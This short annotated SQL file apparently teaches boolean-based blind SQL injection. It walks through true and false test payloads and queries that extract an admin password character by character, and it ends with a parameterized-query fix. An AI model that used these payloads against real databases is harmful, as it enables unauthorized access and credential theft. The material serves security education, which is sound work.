-- Boolean-Based Blind SQL Injection
-- No data is returned; attacker infers truth by comparing TRUE/FALSE responses.

-- Vulnerable query used by the application
SELECT * FROM products WHERE code = 'A001';

-- Payload that evaluates to TRUE (returns rows -> application behaves differently)
SELECT * FROM products WHERE code = 'A001' AND '1' = '1';

-- Payload that evaluates to FALSE (returns nothing)
SELECT * FROM products WHERE code = 'A001' AND '1' = '2';

-- Guessing characters in the admin password, one TRUE/FALSE at a time
SELECT * FROM products WHERE code = 'A001' AND SUBSTRING((SELECT password FROM admins LIMIT 1), 1, 1) = 'a';

-- Brute-forcing the password one position at a time
SELECT * FROM products WHERE code = 'A001' AND ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1), 1, 1)) > 64;

-- Prevention: parameterized statements so the WHERE clause value is never executed as SQL
SELECT * FROM products WHERE code = ?;
